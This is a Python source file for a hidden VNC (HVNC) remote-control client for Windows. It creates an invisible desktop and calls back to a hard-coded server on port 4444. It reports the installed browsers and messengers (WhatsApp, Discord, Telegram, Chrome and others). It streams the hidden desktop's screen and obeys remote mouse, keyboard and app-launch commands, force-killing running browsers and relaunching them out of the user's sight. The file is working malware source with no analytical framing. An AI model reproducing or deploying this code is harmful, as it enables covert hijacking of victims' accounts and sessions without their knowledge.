import ctypes
import ctypes.wintypes
import glob as _glob
import json
import os
import winreg
import subprocess
import socket
import struct
import threading
import time
import io
from PIL import Image


DESKTOP_ALL_ACCESS   = 0x01FF
SRCCOPY              = 0x00CC0020
DIB_RGB_COLORS       = 0
BI_RGB               = 0
CREATE_NEW_CONSOLE   = 0x00000010
STARTF_USESHOWWINDOW = 0x00000001
SW_SHOWNORMAL        = 1

KEYEVENTF_KEYUP = 0x0002


WM_MOUSEMOVE    = 0x0200
WM_LBUTTONDOWN  = 0x0201
WM_LBUTTONUP    = 0x0202
WM_LBUTTONDBLCLK = 0x0203
WM_RBUTTONDOWN  = 0x0204
WM_RBUTTONUP    = 0x0205
WM_RBUTTONDBLCLK = 0x0206
WM_KEYDOWN     = 0x0100
WM_KEYUP       = 0x0101
WM_SETFOCUS    = 0x0007
WM_NCHITTEST   = 0x0084
WM_NCMOUSEMOVE = 0x00A0
WM_NCLBUTTONDOWN  = 0x00A1
WM_NCLBUTTONUP    = 0x00A2
WM_NCLBUTTONDBLCLK = 0x00A3
WM_NCRBUTTONDOWN  = 0x00A4
WM_NCRBUTTONUP    = 0x00A5
WM_SYSCOMMAND   = 0x0112


WM_POINTERMOVE  = 0x0245
WM_POINTERDOWN  = 0x0246
WM_POINTERUP    = 0x0247


_PMF_INRANGE     = 0x0002
_PMF_INCONTACT   = 0x0004
_PMF_FIRSTBUTTON = 0x0010
_PMF_PRIMARY     = 0x2000

_PTR_WP_DOWN = ((_PMF_INRANGE | _PMF_INCONTACT | _PMF_FIRSTBUTTON | _PMF_PRIMARY) << 16) | 1
_PTR_WP_UP   = ((_PMF_INRANGE | _PMF_PRIMARY) << 16) | 1
_PTR_WP_MOVE = ((_PMF_INRANGE | _PMF_PRIMARY) << 16) | 1


_WINUI_CHILD_CLASSES = {
    'Microsoft.UI.Content.DesktopChildSiteBridge',
    'Microsoft.UI.Content.ContentIslandSiteBridge',
    'Windows.UI.Core.CoreWindow',
}

_WINUI_TOP_CLASSES = {
    'WinUIDesktopWin32WindowClass',
}

def _is_winui(hwnd, top):
    return (_wclass(hwnd) in _WINUI_CHILD_CLASSES or
            _wclass(top)  in _WINUI_TOP_CLASSES)

MK_LBUTTON     = 0x0001
MK_RBUTTON     = 0x0002
MAPVK_VK_TO_VSC = 0


HTCLIENT     = 1
HTCAPTION    = 2
HTSYSMENU    = 3
HTVSCROLL    = 7
HTMINBUTTON  = 8
HTMAXBUTTON  = 9
HTCLOSE      = 20


SC_CLOSE    = 0xF060
SC_MINIMIZE = 0xF020
SC_MAXIMIZE = 0xF030
SC_RESTORE  = 0xF120

GA_ROOT = 2

PW_RENDERFULLCONTENT = 0x00000002
BLACK_BRUSH          = 4  

class POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

class RECT(ctypes.Structure):
    _fields_ = [
        ("left",   ctypes.wintypes.LONG),
        ("top",    ctypes.wintypes.LONG),
        ("right",  ctypes.wintypes.LONG),
        ("bottom", ctypes.wintypes.LONG),
    ]

WNDENUMPROC = ctypes.WINFUNCTYPE(
    ctypes.wintypes.BOOL,
    ctypes.wintypes.HWND,
    ctypes.wintypes.LPARAM,
)

class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [
        ("biSize",          ctypes.wintypes.DWORD),
        ("biWidth",         ctypes.wintypes.LONG),
        ("biHeight",        ctypes.wintypes.LONG),
        ("biPlanes",        ctypes.wintypes.WORD),
        ("biBitCount",      ctypes.wintypes.WORD),
        ("biCompression",   ctypes.wintypes.DWORD),
        ("biSizeImage",     ctypes.wintypes.DWORD),
        ("biXPelsPerMeter", ctypes.wintypes.LONG),
        ("biYPelsPerMeter", ctypes.wintypes.LONG),
        ("biClrUsed",       ctypes.wintypes.DWORD),
        ("biClrImportant",  ctypes.wintypes.DWORD),
    ]

class BITMAPINFO(ctypes.Structure):
    _fields_ = [
        ("bmiHeader", BITMAPINFOHEADER),
        ("bmiColors", ctypes.wintypes.DWORD * 3),
    ]

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",              ctypes.wintypes.DWORD),
        ("lpReserved",      ctypes.wintypes.LPWSTR),
        ("lpDesktop",       ctypes.wintypes.LPWSTR),
        ("lpTitle",         ctypes.wintypes.LPWSTR),
        ("dwX",             ctypes.wintypes.DWORD),
        ("dwY",             ctypes.wintypes.DWORD),
        ("dwXSize",         ctypes.wintypes.DWORD),
        ("dwYSize",         ctypes.wintypes.DWORD),
        ("dwXCountChars",   ctypes.wintypes.DWORD),
        ("dwYCountChars",   ctypes.wintypes.DWORD),
        ("dwFillAttribute", ctypes.wintypes.DWORD),
        ("dwFlags",         ctypes.wintypes.DWORD),
        ("wShowWindow",     ctypes.wintypes.WORD),
        ("cbReserved2",     ctypes.wintypes.WORD),
        ("lpReserved2",     ctypes.POINTER(ctypes.c_byte)),
        ("hStdInput",       ctypes.wintypes.HANDLE),
        ("hStdOutput",      ctypes.wintypes.HANDLE),
        ("hStdError",       ctypes.wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    ctypes.wintypes.HANDLE),
        ("hThread",     ctypes.wintypes.HANDLE),
        ("dwProcessId", ctypes.wintypes.DWORD),
        ("dwThreadId",  ctypes.wintypes.DWORD),
    ]

class MOUSEINPUT(ctypes.Structure):
    _fields_ = [
        ("dx",          ctypes.c_long),
        ("dy",          ctypes.c_long),
        ("mouseData",   ctypes.wintypes.DWORD),
        ("dwFlags",     ctypes.wintypes.DWORD),
        ("time",        ctypes.wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
    ]

class KEYBDINPUT(ctypes.Structure):
    _fields_ = [
        ("wVk",         ctypes.wintypes.WORD),
        ("wScan",       ctypes.wintypes.WORD),
        ("dwFlags",     ctypes.wintypes.DWORD),
        ("time",        ctypes.wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
    ]

class _INPUT_DATA(ctypes.Union):
    _fields_ = [("mi", MOUSEINPUT), ("ki", KEYBDINPUT)]

class INPUT(ctypes.Structure):
    _fields_ = [("type", ctypes.wintypes.DWORD), ("_data", _INPUT_DATA)]


user32   = ctypes.windll.user32
gdi32    = ctypes.windll.gdi32
kernel32 = ctypes.windll.kernel32
dwmapi   = ctypes.windll.dwmapi

DWMWA_CAPTION_BUTTON_BOUNDS = 5

# ─── 64-bit HANDLE TYPE DECLARATIONS ─────────────────────────────────────────
# ctypes defaults to c_int (32-bit) for returns; on 64-bit Windows HANDLE is
# a 64-bit pointer → OverflowError without explicit restype/argtypes.
_H = ctypes.c_void_p

user32.GetDC.restype                  = _H
user32.GetDC.argtypes                 = [_H]
user32.ReleaseDC.argtypes             = [_H, _H]
user32.CreateDesktopW.restype         = _H
user32.SetThreadDesktop.argtypes      = [_H]
user32.FillRect.argtypes              = [_H, ctypes.c_void_p, _H]
user32.PrintWindow.argtypes           = [_H, _H, ctypes.wintypes.UINT]
user32.GetWindowRect.argtypes         = [_H, ctypes.c_void_p]
user32.IsWindowVisible.restype        = ctypes.wintypes.BOOL
user32.IsWindowVisible.argtypes       = [_H]
user32.EnumDesktopWindows.argtypes    = [_H, ctypes.c_void_p, ctypes.wintypes.LPARAM]
user32.WindowFromPoint.restype        = _H
user32.WindowFromPoint.argtypes       = [POINT]
user32.ScreenToClient.restype         = ctypes.wintypes.BOOL
user32.ScreenToClient.argtypes        = [_H, ctypes.c_void_p]
user32.PostMessageW.restype           = ctypes.wintypes.BOOL
user32.PostMessageW.argtypes          = [_H, ctypes.wintypes.UINT,
                                          ctypes.wintypes.WPARAM,
                                          ctypes.wintypes.LPARAM]
user32.MapVirtualKeyW.restype         = ctypes.wintypes.UINT
user32.MapVirtualKeyW.argtypes        = [ctypes.wintypes.UINT, ctypes.wintypes.UINT]
user32.SendMessageW.restype           = ctypes.c_long
user32.SendMessageW.argtypes          = [_H, ctypes.wintypes.UINT,
                                          ctypes.wintypes.WPARAM,
                                          ctypes.wintypes.LPARAM]
user32.GetAncestor.restype            = _H
user32.GetAncestor.argtypes           = [_H, ctypes.wintypes.UINT]
user32.SendMessageTimeoutW.restype    = ctypes.c_ulong
user32.SendMessageTimeoutW.argtypes   = [_H, ctypes.wintypes.UINT,
                                          ctypes.wintypes.WPARAM,
                                          ctypes.wintypes.LPARAM,
                                          ctypes.wintypes.UINT,
                                          ctypes.wintypes.UINT,
                                          ctypes.POINTER(ctypes.c_ulong)]

SMTO_ABORTIFHUNG = 0x0002

user32.GetClassNameW.restype  = ctypes.c_int
user32.GetClassNameW.argtypes = [_H, ctypes.wintypes.LPWSTR, ctypes.c_int]

def _wclass(hwnd):
    buf = ctypes.create_unicode_buffer(256)
    user32.GetClassNameW(hwnd, buf, 256)
    return buf.value
user32.GetWindowRect.argtypes         = [_H, ctypes.c_void_p]
user32.GetClientRect.argtypes         = [_H, ctypes.c_void_p]
user32.ClientToScreen.argtypes        = [_H, ctypes.c_void_p]
dwmapi.DwmGetWindowAttribute.restype  = ctypes.c_long
dwmapi.DwmGetWindowAttribute.argtypes = [_H, ctypes.wintypes.DWORD,
                                          ctypes.c_void_p, ctypes.wintypes.DWORD]

gdi32.CreateDCW.restype               = _H
gdi32.CreateDCW.argtypes              = [ctypes.wintypes.LPCWSTR,
                                          ctypes.wintypes.LPCWSTR,
                                          ctypes.wintypes.LPCWSTR,
                                          ctypes.c_void_p]
gdi32.CreateCompatibleDC.restype      = _H
gdi32.CreateCompatibleDC.argtypes     = [_H]
gdi32.CreateCompatibleBitmap.restype  = _H
gdi32.CreateCompatibleBitmap.argtypes = [_H, ctypes.c_int, ctypes.c_int]
gdi32.SelectObject.restype            = _H
gdi32.SelectObject.argtypes           = [_H, _H]
gdi32.DeleteDC.argtypes               = [_H]
gdi32.DeleteObject.argtypes           = [_H]
gdi32.GetStockObject.restype          = _H
gdi32.GetStockObject.argtypes         = [ctypes.c_int]
gdi32.BitBlt.argtypes                 = [_H, ctypes.c_int, ctypes.c_int,
                                          ctypes.c_int, ctypes.c_int,
                                          _H, ctypes.c_int, ctypes.c_int,
                                          ctypes.wintypes.DWORD]
gdi32.GetDIBits.argtypes              = [_H, _H,
                                          ctypes.wintypes.UINT, ctypes.wintypes.UINT,
                                          ctypes.c_void_p, ctypes.c_void_p,
                                          ctypes.wintypes.UINT]


SERVER_HOST  = "192.168.1.5"
SERVER_PORT  = 4444
DESKTOP_NAME = "HvncDesktop"
STREAM_W     = 1280
STREAM_H     = 720
FPS          = 60
JPEG_QUALITY = 70



def _e(p):
    """Expande variables de entorno en paths con forward slash o backslash."""
    return os.path.expandvars(p.replace('/', os.sep))

def _find_first(patterns):
    for p in patterns:
        matches = _glob.glob(_e(p))
        if matches:
            return sorted(matches)[-1]
    return None

def _find_via_registry(exe_name):
    key_path = fr'SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\{exe_name}'
    for hive in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
        try:
            with winreg.OpenKey(hive, key_path) as k:
                path = winreg.QueryValue(k, '').strip('"').strip()
                if os.path.isfile(path):
                    return path
        except OSError:
            pass
    return None

def _find_appx(fragment, exe_name):
    """InstallLocation via Get-AppxPackage. No verifica isfile (WindowsApps bloquea listing pero el exe es ejecutable)."""
    try:
        r = subprocess.run(
            ['powershell', '-NoProfile', '-Command',
             f'Get-AppxPackage *{fragment}* | Select-Object -ExpandProperty InstallLocation -First 1'],
            capture_output=True, text=True, timeout=6
        )
        loc = r.stdout.strip()
        if not loc:
            return None
        return os.path.join(loc, exe_name)
    except Exception:
        return None


_APP_REGISTRY = {
    'whatsapp': (
        ['%LOCALAPPDATA%/Microsoft/WindowsApps/WhatsApp.exe',
         '%LOCALAPPDATA%/Microsoft/WindowsApps/WhatsApp.Root.exe',
         '%LOCALAPPDATA%/WhatsApp/WhatsApp.Root.exe',
         '%LOCALAPPDATA%/Programs/WhatsApp/WhatsApp.Root.exe'],
        ['WhatsApp.exe', 'WhatsApp.Root.exe'],
    ),
    'discord': (
        ['%LOCALAPPDATA%/Discord/app-*/Discord.exe'],
        ['Discord.exe'],
    ),
    'brave': (
        ['%LOCALAPPDATA%/BraveSoftware/Brave-Browser/Application/brave.exe',
         '%PROGRAMFILES%/BraveSoftware/Brave-Browser/Application/brave.exe',
         '%PROGRAMFILES(X86)%/BraveSoftware/Brave-Browser/Application/brave.exe'],
        ['brave.exe'],
    ),
    'chrome': (
        ['%LOCALAPPDATA%/Google/Chrome/Application/chrome.exe',
         '%PROGRAMFILES%/Google/Chrome/Application/chrome.exe',
         '%PROGRAMFILES(X86)%/Google/Chrome/Application/chrome.exe'],
        ['chrome.exe'],
    ),
    'firefox': (
        ['%PROGRAMFILES%/Mozilla Firefox/firefox.exe',
         '%PROGRAMFILES(X86)%/Mozilla Firefox/firefox.exe'],
        ['firefox.exe'],
    ),
    'edge': (
        ['%PROGRAMFILES(X86)%/Microsoft/Edge/Application/msedge.exe',
         '%PROGRAMFILES%/Microsoft/Edge/Application/msedge.exe'],
        ['msedge.exe'],
    ),
    'opera': (
        ['%APPDATA%/Opera Software/Opera Stable/opera.exe',
         '%LOCALAPPDATA%/Programs/Opera/opera.exe'],
        ['opera.exe'],
    ),
    'operagx': (
        ['%APPDATA%/Opera Software/Opera GX Stable/opera.exe'],
        ['opera.exe'],
    ),
    'telegram': (
        ['%APPDATA%/Telegram Desktop/Telegram.exe',
         '%LOCALAPPDATA%/Telegram Desktop/Telegram.exe'],
        ['Telegram.exe'],
    ),
    'explorer': (
        ['%WINDIR%/explorer.exe',
         '%SYSTEMROOT%/explorer.exe'],
        [],
    ),
}


_APPX_LOOKUP = {
    'whatsapp': ('WhatsApp', 'WhatsApp.Root.exe'),
}

_REG_LOOKUP = {
    'whatsapp': 'WhatsApp.Root.exe',
    'discord':  'Discord.exe',
    'chrome':   'chrome.exe',
    'brave':    'brave.exe',
    'firefox':  'firefox.exe',
    'edge':     'msedge.exe',
    'opera':    'opera.exe',
    'operagx':  'opera.exe',
    'telegram': 'Telegram.exe',
    'explorer': 'explorer.exe',
}

def _detect_apps():
    order = [
        ('WhatsApp',  'whatsapp'),
        ('Discord',   'discord'),
        ('Chrome',    'chrome'),
        ('Brave',     'brave'),
        ('Firefox',   'firefox'),
        ('Edge',      'edge'),
        ('Opera GX',  'operagx'),
        ('Opera',     'opera'),
        ('Telegram',  'telegram'),
        ('Explorer',  'explorer'),
    ]
    result = []
    for lbl, aid in order:
        exe      = _REG_LOOKUP.get(aid, '')
        patterns = _APP_REGISTRY.get(aid, ([], []))[0]
        appx     = _APPX_LOOKUP.get(aid)
        if ((exe and _find_via_registry(exe)) or
                _find_first(patterns) or
                (appx and _find_appx(*appx))):
            result.append([lbl, aid])
    return result

def _spawn_on_desktop(cmd):
    if not cmd:
        return
    si = STARTUPINFOW()
    si.cb          = ctypes.sizeof(STARTUPINFOW)
    si.lpDesktop   = f"WinSta0\\{DESKTOP_NAME}"
    si.dwFlags     = STARTF_USESHOWWINDOW
    si.wShowWindow = SW_SHOWNORMAL
    pi = PROCESS_INFORMATION()
    kernel32.CreateProcessW(
        None, cmd, None, None, False,
        CREATE_NEW_CONSOLE, None, None,
        ctypes.byref(si), ctypes.byref(pi)
    )


class CaptureThread(threading.Thread):
    def __init__(self, hDesktop, conn, scr_w, scr_h):
        super().__init__(daemon=True)
        self.hDesktop = hDesktop
        self.conn     = conn
        self.scr_w    = scr_w
        self.scr_h    = scr_h
        self.running  = True

    def run(self):
        user32.SetThreadDesktop(self.hDesktop)

        
        hRefDC = gdi32.CreateDCW("DISPLAY", None, None, None)

        hMemDC = gdi32.CreateCompatibleDC(hRefDC)
        hBmp   = gdi32.CreateCompatibleBitmap(hRefDC, self.scr_w, self.scr_h)
        gdi32.SelectObject(hMemDC, hBmp)

        bmi = BITMAPINFO()
        bmi.bmiHeader.biSize        = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.bmiHeader.biWidth       = self.scr_w
        bmi.bmiHeader.biHeight      = -self.scr_h
        bmi.bmiHeader.biPlanes      = 1
        bmi.bmiHeader.biBitCount    = 32
        bmi.bmiHeader.biCompression = BI_RGB

        buf_sz   = self.scr_w * self.scr_h * 4
        buf      = (ctypes.c_byte * buf_sz)()
        interval = 1.0 / FPS
        hBlack   = gdi32.GetStockObject(BLACK_BRUSH)

        
        windows = []
        def _enum_cb(hwnd, _):
            windows.append(hwnd)
            return True
        cb = WNDENUMPROC(_enum_cb)

        while self.running:
            t0 = time.time()
            try:
               
                rc = RECT(0, 0, self.scr_w, self.scr_h)
                user32.FillRect(hMemDC, ctypes.byref(rc), hBlack)

              
                windows.clear()
                user32.EnumDesktopWindows(self.hDesktop, cb, 0)

                for hwnd in reversed(windows):
                    if not user32.IsWindowVisible(hwnd):
                        continue
                    r = RECT()
                    user32.GetWindowRect(hwnd, ctypes.byref(r))
                    w = r.right - r.left
                    h = r.bottom - r.top
                    if w <= 0 or h <= 0:
                        continue

                    hWndDC  = gdi32.CreateCompatibleDC(hRefDC)
                    hWndBmp = gdi32.CreateCompatibleBitmap(hRefDC, w, h)
                    gdi32.SelectObject(hWndDC, hWndBmp)

              
                    user32.PrintWindow(hwnd, hWndDC, PW_RENDERFULLCONTENT)
                    gdi32.BitBlt(hMemDC, r.left, r.top, w, h,
                                 hWndDC, 0, 0, SRCCOPY)

                    gdi32.DeleteObject(hWndBmp)
                    gdi32.DeleteDC(hWndDC)

                gdi32.GetDIBits(hMemDC, hBmp, 0, self.scr_h, buf,
                                ctypes.byref(bmi), DIB_RGB_COLORS)

                img = Image.frombytes('RGBA', (self.scr_w, self.scr_h),
                                      bytes(buf), 'raw', 'BGRA')
                img = img.convert('RGB').resize((STREAM_W, STREAM_H), Image.LANCZOS)

                bio = io.BytesIO()
                img.save(bio, format='JPEG', quality=JPEG_QUALITY)
                frame = bio.getvalue()

                self.conn.sendall(struct.pack('>I', len(frame)) + frame)
            except Exception as e:
                print(f"[capture] {e}")
                self.running = False
                break

            sleep_t = interval - (time.time() - t0)
            if sleep_t > 0:
                time.sleep(sleep_t)

        gdi32.DeleteObject(hBmp)
        gdi32.DeleteDC(hMemDC)
        gdi32.DeleteDC(hRefDC)


class InputThread(threading.Thread):
    def __init__(self, hDesktop, conn, scr_w, scr_h):
        super().__init__(daemon=True)
        self.hDesktop   = hDesktop
        self.conn       = conn
        self.scr_w      = scr_w
        self.scr_h      = scr_h
        self.running    = True
        self.focus_hwnd = None  

    def _recv(self, n):
        buf = b''
        while len(buf) < n:
            chunk = self.conn.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("disconnected")
            buf += chunk
        return buf

    def run(self):
        user32.SetThreadDesktop(self.hDesktop)
        while self.running:
            try:
                cmd = self._recv(1)[0]
                if cmd == 0x01:
                    x, y = struct.unpack('>ii', self._recv(8))
                    self._mouse_move(x, y)
                elif cmd == 0x02:
                    x, y, btn = struct.unpack('>iiB', self._recv(9))
                    self._mouse_click(x, y, btn)
                elif cmd == 0x03:
                    vk, flags = struct.unpack('>HB', self._recv(3))
                    self._key_event(vk, flags)
                elif cmd == 0x04:
                    x, y, btn = struct.unpack('>iiB', self._recv(9))
                    self._mouse_dblclick(x, y, btn)
                elif cmd == 0x05:
                    length = struct.unpack('>H', self._recv(2))[0]
                    app_id = self._recv(length).decode('utf-8')
                    self._launch_app(app_id)
            except Exception as e:
                print(f"[input] {e}")
                self.running = False
                break


    @staticmethod
    def _makelparam(x, y):
        return ctypes.wintypes.LPARAM(((y & 0xFFFF) << 16) | (x & 0xFFFF))

    def _hwnd_at(self, x, y):
        return user32.WindowFromPoint(POINT(x, y))

    def _toplevel(self, hwnd):
        top = user32.GetAncestor(hwnd, GA_ROOT)
        return top if top else hwnd

    def _to_client(self, hwnd, x, y):
        pt = POINT(x, y)
        user32.ScreenToClient(hwnd, ctypes.byref(pt))
        return pt.x, pt.y

    def _hittest(self, top, x, y):
        """WM_NCHITTEST con timeout (no bloquea) + fallback DWM para Win11."""
        res = ctypes.c_ulong(HTCLIENT)
        user32.SendMessageTimeoutW(
            top, WM_NCHITTEST, 0, self._makelparam(x, y),
            SMTO_ABORTIFHUNG, 50, ctypes.byref(res)
        )
        ht = res.value

        if ht != HTCLIENT:
            return ht

 
        bounds = RECT()
        hr = dwmapi.DwmGetWindowAttribute(
            top, DWMWA_CAPTION_BUTTON_BOUNDS,
            ctypes.byref(bounds), ctypes.sizeof(bounds)
        )
        if hr == 0 and bounds.right > bounds.left:
            wr = RECT()
            user32.GetWindowRect(top, ctypes.byref(wr))
            rx = x - wr.left   
            ry = y - wr.top
            if bounds.top <= ry <= bounds.bottom and bounds.left <= rx <= bounds.right:
                w3 = (bounds.right - bounds.left) // 3
                if   rx >= bounds.right - w3:         return HTCLOSE
                elif rx >= bounds.right - w3 * 2:     return HTMAXBUTTON
                else:                                  return HTMINBUTTON

        return HTCLIENT

    def _nc_action(self, top, ht, lp_screen, btn, dbl=False):
        """Envía el mensaje correcto para área no-cliente."""
        sc = {HTCLOSE: SC_CLOSE, HTMINBUTTON: SC_MINIMIZE,
              HTMAXBUTTON: SC_MAXIMIZE}.get(ht)
        if sc and btn == 0:
            
            user32.SendMessageW(top, WM_SYSCOMMAND, sc, 0)
            return
        
        if btn == 0:
            msg_d = WM_NCLBUTTONDBLCLK if dbl else WM_NCLBUTTONDOWN
            user32.PostMessageW(top, msg_d,          ht, lp_screen)
            user32.PostMessageW(top, WM_NCLBUTTONUP, ht, lp_screen)
        else:
            user32.PostMessageW(top, WM_NCRBUTTONDOWN, ht, lp_screen)
            user32.PostMessageW(top, WM_NCRBUTTONUP,   ht, lp_screen)


    def _mouse_move(self, x, y):
        hwnd = self._hwnd_at(x, y)
        if not hwnd:
            return
        top = self._toplevel(hwnd)
        lp_screen = self._makelparam(x, y)
        ht = self._hittest(top, x, y)
        if ht == HTCLIENT:
            if _is_winui(hwnd, top):
                cx_top, cy_top = self._to_client(top, x, y)
                user32.PostMessageW(top, WM_MOUSEMOVE, 0, self._makelparam(cx_top, cy_top))
            else:
                cx, cy = self._to_client(hwnd, x, y)
                user32.PostMessageW(hwnd, WM_MOUSEMOVE, 0, self._makelparam(cx, cy))
        else:
            user32.PostMessageW(top, WM_NCMOUSEMOVE, ht, lp_screen)

    def _mouse_click(self, x, y, btn):
        hwnd = self._hwnd_at(x, y)
        if not hwnd:
            return
        self.focus_hwnd = hwnd
        top = self._toplevel(hwnd)
        lp_screen = self._makelparam(x, y)
        ht = self._hittest(top, x, y)

        if ht == HTCLIENT:
            print(f"[click]  hwnd={hwnd:#010x} class={_wclass(hwnd)!r:30s} ht=CLIENT  sc={x},{y}")
            if _is_winui(hwnd, top):
                # WinUI 3: child bridge ignora WM_LBUTTON* y WM_POINTER* (GetPointerInfo falla).
                # El top-level WinUIDesktopWin32WindowClass SÍ convierte WM_LBUTTON* a pointer
                # input y lo rutea al árbol XAML según coords.
                cx_top, cy_top = self._to_client(top, x, y)
                lp_top = self._makelparam(cx_top, cy_top)
                if btn == 0:
                    user32.PostMessageW(top, WM_LBUTTONDOWN, MK_LBUTTON, lp_top)
                    user32.PostMessageW(top, WM_LBUTTONUP,   0,           lp_top)
                else:
                    user32.PostMessageW(top, WM_RBUTTONDOWN, MK_RBUTTON, lp_top)
                    user32.PostMessageW(top, WM_RBUTTONUP,   0,           lp_top)
            else:
                cx, cy = self._to_client(hwnd, x, y)
                lp = self._makelparam(cx, cy)
                if btn == 0:
                    user32.PostMessageW(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, lp)
                    user32.PostMessageW(hwnd, WM_LBUTTONUP,   0,           lp)
                else:
                    user32.PostMessageW(hwnd, WM_RBUTTONDOWN, MK_RBUTTON, lp)
                    user32.PostMessageW(hwnd, WM_RBUTTONUP,   0,           lp)
        else:
            print(f"[click]  hwnd={hwnd:#010x} class={_wclass(top)!r:30s} ht={ht:<6d} sc={x},{y}")
            self._nc_action(top, ht, lp_screen, btn)

    def _mouse_dblclick(self, x, y, btn):
        hwnd = self._hwnd_at(x, y)
        if not hwnd:
            return
        self.focus_hwnd = hwnd
        top = self._toplevel(hwnd)
        lp_screen = self._makelparam(x, y)
        ht = self._hittest(top, x, y)

        if ht == HTCLIENT:
            if _is_winui(hwnd, top):
                cx_top, cy_top = self._to_client(top, x, y)
                lp_top = self._makelparam(cx_top, cy_top)
                if btn == 0:
                    user32.PostMessageW(top, WM_LBUTTONDBLCLK, MK_LBUTTON, lp_top)
                    user32.PostMessageW(top, WM_LBUTTONUP,     0,           lp_top)
                else:
                    user32.PostMessageW(top, WM_RBUTTONDBLCLK, MK_RBUTTON, lp_top)
                    user32.PostMessageW(top, WM_RBUTTONUP,     0,           lp_top)
            else:
                cx, cy = self._to_client(hwnd, x, y)
                lp = self._makelparam(cx, cy)
                if btn == 0:
                    user32.PostMessageW(hwnd, WM_LBUTTONDBLCLK, MK_LBUTTON, lp)
                    user32.PostMessageW(hwnd, WM_LBUTTONUP,     0,           lp)
                else:
                    user32.PostMessageW(hwnd, WM_RBUTTONDBLCLK, MK_RBUTTON, lp)
                    user32.PostMessageW(hwnd, WM_RBUTTONUP,     0,           lp)
        else:
            self._nc_action(top, ht, lp_screen, btn, dbl=True)

    def _launch_app(self, app_id):
        entry = _APP_REGISTRY.get(app_id.lower())
        if entry:
            patterns, kill_procs = entry
            for proc in kill_procs:
                subprocess.run(['taskkill', '/F', '/IM', proc],
                               capture_output=True)
            time.sleep(0.4)
            reg_exe = _REG_LOOKUP.get(app_id.lower(), '')
            cmd = ((reg_exe and _find_via_registry(reg_exe)) or
                   _find_first(patterns))
            if not cmd:
                appx = _APPX_LOOKUP.get(app_id.lower())
                if appx:
                    cmd = _find_appx(*appx)
            if cmd:
                _spawn_on_desktop(f'"{cmd}"')
            else:
                print(f"[launch] no encontrado: {app_id}")
        else:
            _spawn_on_desktop(app_id)

    def _key_event(self, vk, flags):
        hwnd = self.focus_hwnd
        if not hwnd:
        
            wins = []
            cb = WNDENUMPROC(lambda h, _: wins.append(h) or True)
            user32.EnumDesktopWindows(self.hDesktop, cb, 0)
            hwnd = next((h for h in wins if user32.IsWindowVisible(h)), None)
            if not hwnd:
                return

        scan = user32.MapVirtualKeyW(vk, MAPVK_VK_TO_VSC)
        if flags & KEYEVENTF_KEYUP:
            lp = ctypes.wintypes.LPARAM(
                1 | (scan << 16) | (1 << 30) | (1 << 31))
            user32.PostMessageW(hwnd, WM_KEYUP, vk, lp)
        else:
            lp = ctypes.wintypes.LPARAM(1 | (scan << 16))
            user32.PostMessageW(hwnd, WM_KEYDOWN, vk, lp)


class HVNCClient:
    def __init__(self):
        self.scr_w    = user32.GetSystemMetrics(0)
        self.scr_h    = user32.GetSystemMetrics(1)
        self.hDesktop = None
        self.sock     = None

    def _create_desktop(self):
        self.hDesktop = user32.CreateDesktopW(
            DESKTOP_NAME, None, None, 0, DESKTOP_ALL_ACCESS, None
        )
        if not self.hDesktop:
            raise ctypes.WinError(kernel32.GetLastError())

    def _spawn_process(self, cmd):
        si = STARTUPINFOW()
        si.cb          = ctypes.sizeof(STARTUPINFOW)
        si.lpDesktop   = f"WinSta0\\{DESKTOP_NAME}"
        si.dwFlags     = STARTF_USESHOWWINDOW
        si.wShowWindow = SW_SHOWNORMAL
        pi = PROCESS_INFORMATION()
        kernel32.CreateProcessW(
            None, cmd, None, None, False,
            CREATE_NEW_CONSOLE, None, None,
            ctypes.byref(si), ctypes.byref(pi)
        )

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((SERVER_HOST, SERVER_PORT))

        
        self.sock.sendall(struct.pack('>II', self.scr_w, self.scr_h))
        apps_json = json.dumps(_detect_apps()).encode('utf-8')
        self.sock.sendall(struct.pack('>H', len(apps_json)) + apps_json)
        print(f"[+] Connected — resolution {self.scr_w}x{self.scr_h}")

        self._create_desktop()
        self._spawn_process("explorer.exe")

        CaptureThread(self.hDesktop, self.sock, self.scr_w, self.scr_h).start()
        InputThread(self.hDesktop, self.sock, self.scr_w, self.scr_h).start()

        while True:
            time.sleep(1)


if __name__ == "__main__":
    HVNCClient().connect()
